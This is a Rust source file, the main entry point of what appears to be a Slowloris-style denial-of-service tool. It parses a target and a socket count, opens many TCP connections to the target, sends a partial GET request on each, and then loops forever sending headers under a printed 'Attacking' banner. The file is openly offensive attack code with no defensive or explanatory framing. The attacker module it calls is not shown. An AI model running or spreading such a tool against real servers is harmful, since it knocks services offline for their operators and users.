mod arg_parser;
mod attacker;

use std::net::TcpStream;

use arg_parser::{Args, Parser};

fn main() {
    // Parse arguments
    let args = Args::parse();

    // Resolve addresses
    println!("[*] Resolving address");
    let addr = match attacker::resolve_address(args.target) {
        Ok(a) => a,
        Err(_) => {
            println!("[!] Error resolving address"); 
            std::process::exit(1);
        },
    };

    // Create connections
    println!("[*] Creating {} connections", args.socket_num);
    let mut streams: Vec<TcpStream>;
    match attacker::make_connections(addr, args.port, args.socket_num) {
        Ok(s) => {
            println!("[*] Connections successful");
            streams = s;
        }
        Err(e) => {
            println!("[!] Errors have occurred:");
            for i in e {
                println!("[!] ---- {}", i);
            }
            std::process::exit(1);
        }
    };

    // Send intial GET request line
    println!("[*] Preparing streams");
    for i in 0..streams.len() {
        match attacker::prepare_stream(&mut streams[i]) {
            Ok(_) => (),
            Err(e) => {
                println!("[!] Error while preparing stream ---- {}", e);
                std::process::exit(1);
            }
        }
    }
    println!("[*] Prepared streams");

    // Enter attack cycle
    println!("[*] Attacking");
    loop {
        for i in 0..streams.len() {
            match attacker::send_header(&mut streams[i]) {
                Ok(_) => (),
                Err(e) => {
                    println!("[!] Error during header send ---- {}", e);
                    std::process::exit(1);
                }
            }
        }
    }
}
